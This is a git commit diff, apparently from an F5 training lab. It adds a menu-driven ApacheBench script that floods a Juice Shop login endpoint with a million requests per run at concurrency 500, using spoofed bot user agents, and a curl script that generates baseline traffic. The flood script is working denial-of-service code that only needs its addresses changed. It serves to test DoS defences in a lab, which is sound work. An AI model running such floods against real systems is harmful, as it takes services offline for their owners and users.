8dbf5def7be2042ee9d95771a8268c0ecee31339
F5 Student <f5student@ip-10-1-1-7.us-west-2.compute.internal>
2021-02-11 21:47:09 +0000

    first commit

--- AB_SSL_DOS.sh
+++ AB_SSL_DOS.sh
@@ -1,62 +1,125 @@
 #!/bin/bash
 
+#AB_SSL_DOS
+
 #PLEASE REPLACE ADDRESSES######
+
 VS_ADDR=10.1.10.145
+
 SRC_ADDR1=10.1.10.51
+
 SRC_ADDR2=10.1.10.52
+
 SRC_ADDR3=10.1.10.53
+
 ###############################
+
+
 
 stop_flag=0
 
+
+
 # trap ctrl-c and call ctrl_c()
+
 trap ctrl_c INT
 
+
+
 function ctrl_c() {
+
     echo "** Trapped CTRL-C"
+
     stop_flag=1
+
 }
 
+
+
 PS5='Please enter your choice: '
+
 options=("Attack start - similarity" "Attack start - score"  "Attack end" "Quit")
+
 select opt in "${options[@]}"
+
 do
+
     case $opt in
+
         "Attack start - similarity")
+
             echo "Start attack"
+
 	    stop_flag=0
+
             while [ "$stop_flag" -eq 0 ]
+
 	    do
-		    ab -B ${SRC_ADDR1} -f TLS1 -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/ &
-		    ab -B ${SRC_ADDR2} -f TLS1 -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/ &
-		    ab -B ${SRC_ADDR3} -f TLS1 -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/
+
+		    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: juiceshop.f5agility.com" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/rest/user/login &
+
+		    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: juiceshop.f5agility.com" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/rest/user/login &
+
+		    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: juiceshop.f5agility.com" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/rest/user/login
+
+
 
 		    killall ab
+
 	    done
+
             ;;
+
         "Attack start - score")
+
 	echo "Start attack"
+
 	    stop_flag=0
+
             while [ "$stop_flag" -eq 0 ]
+
 	    do
-		    ab -B ${SRC_ADDR1} -f TLS1 -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/ &
-            ab -B ${SRC_ADDR2} -f TLS1 -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/second.jpg &
-		    ab -B ${SRC_ADDR3} -f TLS1 -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: https://10.0.2.2/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/
+
+		    ab -B ${SRC_ADDR1}  -l -r -n 1000000 -c 500 -d -H "Host: juiceshop.f5agility.com" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: https://10.0.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/rest/user/login &
+
+        ab -B ${SRC_ADDR2}  -l -r -n 1000000 -c 500 -d -H "Host: juiceshop.f5agility.com" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/assets/public/images/products/apple_juice.jpg &
+
+		    ab -B ${SRC_ADDR3}  -l -r -n 1000000 -c 500 -d -s 10 -H "Host: juiceshop.f5agility.com" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: https://10.0.2.2/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  https://${VS_ADDR}/rest/user/login
+
+
 
 		    killall ab
+
 	    done
 
+
+
             ;;
+
+
 
         "Attack end")
+
             echo "Terminate attack"
 
+
+
         killall ab
+
             ;;
 
+
+
         "Quit")
+
             break
+
             ;;
+
         *) echo invalid option;;
+
     esac
+
 done
+
+
--- baseline_menu.sh
+++ baseline_menu.sh
@@ -1,69 +1,139 @@
 #!/bin/bash
 
+#baseline_menu
+
 # v1.0 by sVen Mueller
-## This script creates dynamic basline traffic
+
+## This script creates dynamic baseline traffic
+
+
 
 clear
+
 echo "Traffic Baselining"
+
 echo
+
 #IP=$1
-IP="10.1.10.145"
+
+IP="juiceshop.f5agility.com"
+
 #if [ "$IP" == "" ]
+
 # then
+
 #        #echo -n "Enter Target IP as an Argument"
+
 #        #exit
+
 #fi
 
-BASELINE='Please enter your type of baslining: '
+
+
+BASELINE='Please enter your type of baselining: '
+
 options=("increasing" "alternate" "Quit")
+
 select opt in "${options[@]}"
+
 do
+
         case $opt in
+
                 "increasing")
+
                         while true; do
+
                                 clear
+
                                 echo "Hourly increasing HTTP traffic: $IP"
+
                                 echo
+
 				for i in $(eval echo "{0..`date +%M`}")
+
                                         do
-                                                curl -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" http://$IP`shuf -n 1 ./source/urls.txt`
-                                                curl -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  http://$IP`shuf -n 1 ./source/urls.txt`
-                                                curl -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  http://$IP`shuf -n 1 ./source/urls.txt`
-                                                #curl -0 -s -o /dev/null -A "`sort -R ./source/useragents_with_bots.txt | head -1`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" http://$IP`sort -R ./source/urls.txt | head -1`
+
+                                                curl -k -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                curl -k -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                curl -k -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                #curl -0 -s -o /dev/null -A "`sort -R ./source/useragents_with_bots.txt | head -1`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" https://$IP`sort -R ./source/urls.txt | head -1`
+
                                         done
+
                                 #sleep 0.1
+
                         done
+
                 ;;
+
                 "alternate")
+
                         while true; do
+
                                 clear
+
                                 echo "Hourly alternate HTTP traffic: $IP"
+
                                 echo
+
                                 #if (( {`date +%k` % 2} )); then
+
                                 if (( `date +%k` % 2 )); then
+
                                         for i in {1..100};
+
                                                 do
-                                                        curl -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`" -w "High:\tstatus: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" http://$IP`shuf -n 1 ./source/urls.txt`
-                                                        curl -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  http://$IP`shuf -n 1 ./source/urls.txt`
-                                                        curl -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  http://$IP`shuf -n 1 ./source/urls.txt`
-#                                                	curl -0 -s -o /dev/null -A "`sort -R ./source/useragents_with_bots.txt | head -1`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" http://$IP`sort -R ./source/urls.txt | head -1`
+
+                                                        curl -k -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`" -w "High:\tstatus: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                        curl -k -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                        curl -k -0 --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  https://$IP`shuf -n 1 ./source/urls.txt`
+
+#                                                	curl -k -0 -s -o /dev/null -A "`sort -R ./source/useragents_with_bots.txt | head -1`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" https://$IP`sort -R ./source/urls.txt | head -1`
+
                                                 done
+
                                 else
+
                                         for i in {1..50};
+
                                                 do
-                                                        curl --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`" -w "High:\tstatus: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" http://$IP`shuf -n 1 ./source/urls.txt`
-                                                        curl --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  http://$IP`shuf -n 1 ./source/urls.txt`
-                                                        curl --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  http://$IP`shuf -n 1 ./source/urls.txt`
-                                                #curl -0 -s -o /dev/null -A "`sort -R ./source/useragents_with_bots.txt | head -1`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" http://$IP`sort -R ./source/urls.txt | head -1`
+
+                                                        curl -k --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`" -w "High:\tstatus: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                        curl -k --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                        curl -k --interface 10.1.10.100 -s -o /dev/null -A "`shuf -n 1 ./source/useragents_with_bots.txt`"  https://$IP`shuf -n 1 ./source/urls.txt`
+
+                                                #curl -0 -s -o /dev/null -A "`sort -R ./source/useragents_with_bots.txt | head -1`" -w "status: %{http_code}\tbytes: %{size_download}\ttime: %{time_total}\n" https://$IP`sort -R ./source/urls.txt | head -1`
+
                                                 done
+
                                 fi
+
                                 #sleep 0.1
+
                                 clear
+
                         done
+
                 ;;
+
                 "Quit")
+
                         break
+
                 ;;
+
         *) echo invalid option;;
+
     esac
+
 done
+
+
